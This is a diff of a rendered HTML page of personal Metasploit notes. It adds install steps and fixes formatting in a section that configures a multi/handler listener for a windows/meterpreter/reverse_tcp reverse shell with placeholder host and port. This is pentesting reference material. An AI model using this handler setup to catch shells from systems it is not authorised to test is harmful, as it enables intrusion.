@@ -3,7 +3,7 @@
 <meta charset=utf-8>
 <meta name=viewport content="width=device-width,initial-scale=1">
 <meta name=generator content="Hugo 0.88.0">
-<meta name=description content="Metasploit description.">
+<meta name=description content="The world’s most used penetration testing framework">
 <meta name=author content="Justin Perdok">
 <link rel=icon href=/images/favicon.png type=image/png>
 <title>Metasploit :: My notes and snippets</title>
@@ -1153,10 +1153,14 @@ Hugo
 <div id=body-inner>
 <h2 id=metasploit>Metasploit</h2>
 <h3 id=install>Install</h3>
-<pre><code>https://github.com/rapid7/metasploit-framework/releases
+<p>Easiest way is to use Kali/Parrot and install from repo</p>
+<pre><code class=language-bash>apt install metasploit-framework
+</code></pre>
+<p>otherwise download from</p>
+<pre><code class=language-bash>https://github.com/rapid7/metasploit-framework/releases
 </code></pre>
 <h3 id=usage>Usage</h3>
-<pre><code class=language-bash>msfconsole [options]]
+<pre><code class=language-bash>msfconsole [options]
 </code></pre>
 <h3 id=flags>Flags</h3>
 <pre><code class=language-bash>Common options:
@@ -1205,11 +1209,11 @@ run&quot;
 </code></pre>
 <h4 id=multi-handler-for-reverse-shell>Multi-handler for reverse shell</h4>
 <p>To get multiple session on a single multi/handler, you need to set the ExitOnSession option to false and run the exploit -j instead of just the exploit. For example, for meterpreter/reverse_tcp payload,</p>
-<pre><code class=language-bash>use exploit/multi/handler  
-set payload windows/meterpreter/reverse_tcp  
-set lhost &lt;IP&gt;  
-set lport &lt;PORT&gt;  
-set ExitOnSession false  
+<pre><code class=language-bash>use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set lhost &lt;IP&gt;
+set lport &lt;PORT&gt;
+set ExitOnSession false
 exploit -j
 </code></pre>
 <p>The -j option is to keep all the connected session in the background.</p>
